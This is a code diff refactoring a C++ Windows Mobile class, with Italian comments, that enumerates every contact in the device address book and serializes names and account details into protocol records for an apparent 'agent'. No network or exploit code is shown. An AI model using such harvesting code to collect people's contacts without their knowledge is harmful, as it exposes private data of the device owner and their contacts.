@@ -25,12 +25,6 @@ CPoomAddressbook* CPoomAddressbook::self()
 	return m_pInstance;
 }
 
-CPoomAddressbook::~CPoomAddressbook()
-{
-
-	CPoomAddressbook::m_pInstance = NULL;
-
-}
 
 
 void CPoomAddressbook::HandleMultiValuedProperties(unsigned int cAggregatedProps,void *rgAggregatedPropVals, CONTACTACC* contact)
@@ -336,26 +330,27 @@ void CPoomAddressbook::_SerializeString(LPBYTE *lpDest, LPCWSTR lpString, int en
 
 
 
-CPoomAddressbook::CPoomAddressbook()
+CPoomAddressbook::CPoomAddressbook():requestedCount(REQ_COUNT),m_bIsValid(FALSE),handleCount(0)
 {
-	UINT err=_PoomDataServiceClient_Init();
+	err=_PoomDataServiceClient_Init();
 
-	DWORD hPoom;
+	
 	err=_PoomDataServiceClient_GetObjectsEnumerator(L"Contacts: All",&hPoom);
 
 	//_PIMPR_ERROR_NOT_FOUND significa che ci sono 0 contatti
 	if(err==_PIMPR_ERROR_NOT_FOUND||err==_PIMPR_ERROR_ACCESS_DENIED)
 		 return;
 
-	#define REQ_COUNT 2000 //se un utente ha piu' di 2000 contatti gli altri vengono persi
-	UINT requestedCount=REQ_COUNT;
-	UINT handleCount;
-	DWORD ptrArray[REQ_COUNT];
+	m_bIsValid = TRUE;
+	
+}
 
+void CPoomAddressbook::Run(UINT uAgentId)
+{
 
 	err=_PoomDataServiceClient_MoveNext(hPoom,requestedCount,&handleCount,ptrArray); //in handleCount mi ritrovo il numero di contatti che ho
 
-	CONTACT **contacts = (CONTACT **) ptrArray;
+	contacts = (CONTACT **) ptrArray;
 	CONTACT* ptrArr;
 	SOURCEDPROPVAL* ptrS;
 	PSOURCEDPROPVAL* ptrPS;
@@ -485,14 +480,13 @@ CPoomAddressbook::CPoomAddressbook()
 		ContactMapType* pMap = NULL;
 		HeaderStruct header;
 		DWORD lpdwOutLength;
-
-		
+				
 		header.dwVersion=POOM_V2_0_PROTO;
 		header.lOid=contact.Id;
 		header.flags=NULL;
 		header.program=0x08; //visto che non riesco a tirare fuori gli id skype pur sapendo che è un conctact skype a sto punto li considero tutti contact phone
 
-
+		//calcolo la grandezza dei dati che devo passare
 		lpdwOutLength = sizeof(HeaderStruct);
 		lpdwOutLength += _SerializedStringLength(contact.CompleteName.FirstName);
 		lpdwOutLength += _SerializedStringLength(contact.CompleteName.LastName);
@@ -550,11 +544,14 @@ CPoomAddressbook::CPoomAddressbook()
 		{
 			addNotes += L"Nickname:";
 			addNotes += contact.CompleteName.Nickname;
-			addNotes += L" ";
+			addNotes += L" } { ";
 		}
+
+		addNotes += L"Contact from: ";
 
 		for (int k=0;k<contact.NumAccount;k++)
 		{
+			/*
 			switch (contact.NameAccountKind[k])
 			{
 				case Phone:
@@ -577,11 +574,12 @@ CPoomAddressbook::CPoomAddressbook()
 					break;
 			}
 			addNotes += L":";
+			*/
 			addNotes += contact.NameAccount[k];
-			addNotes += L" ";
+			if(k<contact.NumAccount-1) addNotes += L", ";
 
 		}
-		addNotes += L"}";
+		addNotes += L" }";
 		
 		lpdwOutLength += _SerializedStringLength(addNotes.c_str());
 
@@ -657,13 +655,19 @@ CPoomAddressbook::CPoomAddressbook()
 
 	}
 
-		//dealloco gli oggetti
+
+
+}
+
+CPoomAddressbook::~CPoomAddressbook()
+{
+	//dealloco gli oggetti
 	for(int i=0; i < handleCount; i++)
 	{
-			
 		_PoomDataServiceClient_FreeObject((DWORD*)contacts[i]);
 	}
 
 	_PoomDataServiceClient_FreeEnumerator(hPoom);
 
+	CPoomAddressbook::m_pInstance = NULL;
 }
